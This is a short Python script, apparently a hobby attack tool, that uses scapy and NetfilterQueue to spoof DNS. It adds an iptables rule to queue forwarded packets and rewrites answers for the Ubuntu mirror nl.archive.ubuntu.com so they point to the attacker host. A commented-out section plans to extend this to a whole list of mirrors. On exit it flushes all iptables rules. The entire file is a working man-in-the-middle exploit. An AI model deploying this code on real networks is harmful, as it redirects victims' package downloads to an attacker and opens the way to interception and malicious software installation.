from scapy.all import IP, DNS, DNSRR, DNSQR, UDP, get_if_addr
from netfilterqueue import NetfilterQueue
import os
from mirrors import getListOfMirrors

def dns_spoof(interface):
    global iface
    iface = interface

    QUEUE_NUM = 0
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))

    nfqueue = NetfilterQueue()

    try:
        print("Started DNS spoofing")

        nfqueue.bind(QUEUE_NUM, process_packet)
        nfqueue.run()
    except KeyboardInterrupt:
        print("Stopped DNS spoofing")
        os.system("iptables --flush")

def process_packet(packet):
    scapy_packet = IP(packet.get_payload())

    if (scapy_packet.haslayer(DNSRR)):
        print("DNS request for IP: " + str(scapy_packet.summary()))
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            pass
        print("Modified request for IP: " + str(scapy_packet.summary()))
        packet.set_payload(bytes(scapy_packet))

    packet.accept()

def modify_packet(packet):
    qname = packet[DNSQR].qname
    # print("Getting list of mirrors")
    # mirrors = getListOfMirrors()
    # Commented put bc I need to research how exactly the DNS qname stuff works, bc it seems slightly strange and I am too tired to do it right now haha
    # if qname in mirrrors:
    if qname == b"nl.archive.ubuntu.com.":
        packet[DNS].an = DNSRR(rrname=qname, rdata=get_if_addr(iface))

        packet[DNS].ancount = 1

        del packet[IP].len
        del packet[IP].chksum
        del packet[UDP].len
        del packet[UDP].chksum

    return packet
